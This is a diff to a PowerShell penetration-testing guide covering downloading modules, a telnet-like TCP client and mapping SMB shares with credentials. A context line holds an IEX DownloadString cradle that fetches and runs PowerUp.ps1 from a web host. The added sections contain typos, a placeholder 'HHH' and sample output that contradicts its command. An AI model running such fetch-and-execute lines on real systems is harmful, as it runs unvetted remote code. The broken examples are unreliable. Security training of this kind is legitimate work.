@@ -114,7 +114,11 @@ Once you have a PowerShell shell then you can use the following to download file
 PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://www.snowcapcyber.co.uk/PowerUp.ps1')
 ```
 
-Now that we have the ability to profile PowerShell and find/install modules we can begin to use it to perform a penetration test.
+PowerDhell also supports a set of functions that allow us to explore and manipulate a file system
+
+
+
+Now that we have the ability to use PowerShell and find/install modules we can begin to use it to perform a penetration test.
 
 ## Chapter 2 - Network Mapping
 
@@ -307,29 +311,11 @@ The goal of the following PowerShell tool is to connect to a TCP port on a targe
 ```
 
 With some TCP servers we may wish to interact directly. So the following allow is to specify and what machines we wish to talk to and on what ports. The functiuoinality of the following PowerShell is akin to that of the Telnet utility.
-```powershell
-$Server = "www.snowcapcyber.co.uk
-$TCPPort = "80"
-$tcpConnection = New-Object System.Net.Sockets.TcpClient($Server, $TCPPort)
-$tcpStream = $tcpConnection.GetStream()
-$reader = New-Object System.IO.StreamReader($tcpStream)
-$writer = New-Object System.IO.StreamWriter($tcpStream)
-$writer.AutoFlush = $true
-while ($tcpConnection.Connected)
-{
-    while ($tcpStream.DataAvailable) { $reader.ReadLine() }
-    if ($tcpConnection.Connected)
-    {
-        Write-Host -NoNewline "> "
-        $command = Read-Host
-        if ($command -eq "escape") { break }
-        $writer.WriteLine($command) | Out-Null
-    }
-}
 
-$reader.Close()
-$writer.Close()
-$tcpConnection.Close()
+```powershell
+PS > ./PowerTelnet.ps1 -ComputerName www.snowcapcyber.com -Port 80
+Creating a connection to: www.snowcapcyber.com  on TCP port:  80
+prompt>
 ```
 
 So in the above we are going to connect an HTTP/WWW server and then send commands and receive/display the results.
@@ -535,6 +521,27 @@ PS C:\> Get-SmbShare -ScopeName "App-Dev01"
 Name                          ScopeName                     Path                          Description
 ----                          ---------                     ----                          -----------
 D$                            App-Dev0                      D:\                           Default Share
+```
+
+We can user PowerShell to create a mapped SMB drive. The following creates a temporary PowerShell drive that's mapped to a network share.
+
+```powershell
+PS C:\> New-PSDrive -Name "Public" -PSProvider "FileSystem" -Root "\\server01.snowcapcyber.co.uk\Public"
+
+Name       Provider      Root
+----       --------      ----
+Public     FileSystem    \\server01.snowcapcyber.co.uk\Public
+```
+
+New-PSDrive uses the Name parameter to specify PowerShell drive named Public and the PSProvider parameter to specify the PowerShell FileSystem provider. The Root parameter specifies the network share's UNC path. We can also HHH to create a persistent network drive. The following maps a network drive that's authenticated with a domain service account's credentials. For more information about the PSCredential object that stores credentials and how passwords are stored as a SecureString, see the Credential parameter's description.
+```powershell
+PS C:\> $cred = Get-Credential -Credential SnowCapCyber\
+NPS C:\> New-PSDrive -Name "X" -Root "\\server01.snowcapcyber.co.uk\Public" -Persist -PSProvider "FileSystem" -Credential $cred
+Net Use
+
+Status       Local     Remote                    Network
+---------------------------------------------------------
+OK           X:        \\Server01\Scripts        Microsoft Windows Network
 ```
 
 ## Chapter 9 - Active Directory (AD)
